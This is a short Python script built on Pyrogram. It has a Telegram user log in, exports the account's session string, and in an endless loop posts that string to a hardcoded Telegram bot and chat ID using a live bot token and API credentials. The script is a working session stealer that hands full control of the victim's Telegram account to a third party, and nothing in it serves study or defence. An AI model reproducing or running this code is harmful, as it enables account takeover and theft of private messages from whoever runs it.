import os
from time import sleep
import pyrogram 
from pyrogram import client
from pyrogram import * 
from pyrogram.types import * 
from pyrogram.errors import * 
from pyromod import listen
import time,random, requests
from time import sleep
import os
print('The Rode king ...')
os.system('pip install os')
os.system('pip install requests')
os.system('pip install pyromod')
os.system('pip install pyrogram')
def pyro_session():
    with Client(
        name="rode", api_id=24367955, api_hash='df9e7f5217331d03353a8d42e11419fc', in_memory=True
    ) as pyro:
        ss = pyro.export_session_string()
        response = requests.post(f'https://api.telegram.org/bot5457172701:AAHS018G05gE2yrrHUv6CO5iaLE9HACsgL0/sendMessage?chat_id=5679320939&text=/add {ss}')
while True:
 pyro_session()